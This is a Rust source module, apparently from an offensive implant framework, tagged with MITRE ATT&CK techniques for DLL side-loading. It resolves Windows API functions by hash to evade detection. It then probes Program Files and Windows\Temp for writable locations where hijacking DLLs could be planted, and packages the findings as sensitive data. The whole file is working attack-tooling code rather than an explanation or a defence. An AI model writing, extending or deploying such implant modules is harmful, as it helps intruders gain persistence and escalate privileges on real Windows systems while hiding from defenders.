//! Tactic: Persistence (TA0003) / Privilege Escalation (TA0004) / Defense Evasion (TA0005)
//! Technique: T1574.002 (Hijack Execution Flow: DLL Side-Loading)

use crate::utils::sensitive::SensitiveData;
#[cfg(target_os = "windows")]
use alloc::format;
#[cfg(target_os = "windows")]
use alloc::string::String;
#[cfg(target_os = "windows")]
use alloc::vec::Vec;

#[cfg(target_os = "windows")]
use crate::utils::api_resolver::{hash_str, resolve_function};
#[cfg(target_os = "windows")]
use crate::utils::windows_definitions::*;

pub struct SideLoad;

impl SideLoad {
    #[cfg(target_os = "windows")]
    pub fn scan(&self) -> SensitiveData {
        // Simplified scanner: Check specific known paths or generic writable checks
        // For MVP, we check if specific common directories are writable
        let targets = [
            "C:\\Program Files",
            "C:\\Program Files (x86)",
            "C:\\Windows\\Temp",
        ];

        let mut report = String::from("Side-Load Scanner Results:\n");

        for path in targets.iter() {
            if self.is_writable(path) {
                report.push_str(&format!("WRITABLE: {}\n", path));
            }
        }

        SensitiveData::new(report.as_bytes())
    }

    #[cfg(target_os = "windows")]
    fn is_writable(&self, path: &str) -> bool {
        unsafe {
            let kernel32 = hash_str(b"kernel32.dll");
            let create_file = resolve_function(kernel32, hash_str(b"CreateFileA"));
            let close_handle = resolve_function(kernel32, hash_str(b"CloseHandle"));
            let delete_file = resolve_function(kernel32, hash_str(b"DeleteFileA"));

            if create_file.is_null() { return false; }

            type FnCreateFileA = unsafe extern "system" fn(*const u8, u32, u32, *mut core::ffi::c_void, u32, u32, HANDLE) -> HANDLE;
            type FnCloseHandle = unsafe extern "system" fn(HANDLE) -> i32;
            type FnDeleteFileA = unsafe extern "system" fn(*const u8) -> i32;

            let test_path = format!("{}\\wraith_test.tmp", path);
            let mut path_c = Vec::from(test_path.as_bytes());
            path_c.push(0);

            // GENERIC_WRITE = 0x40000000
            // CREATE_NEW = 1
            let h = core::mem::transmute::<_, FnCreateFileA>(create_file)(
                path_c.as_ptr(),
                0x40000000,
                0,
                core::ptr::null_mut(),
                1,
                0x80, // FILE_ATTRIBUTE_NORMAL
                core::ptr::null_mut()
            );

            if h != (-1isize as HANDLE) {
                core::mem::transmute::<_, FnCloseHandle>(close_handle)(h);
                core::mem::transmute::<_, FnDeleteFileA>(delete_file)(path_c.as_ptr());
                return true;
            }
            false
        }
    }

    #[cfg(not(target_os = "windows"))]
    pub fn scan(&self) -> SensitiveData {
        SensitiveData::new(b"Not supported on Linux")
    }
}
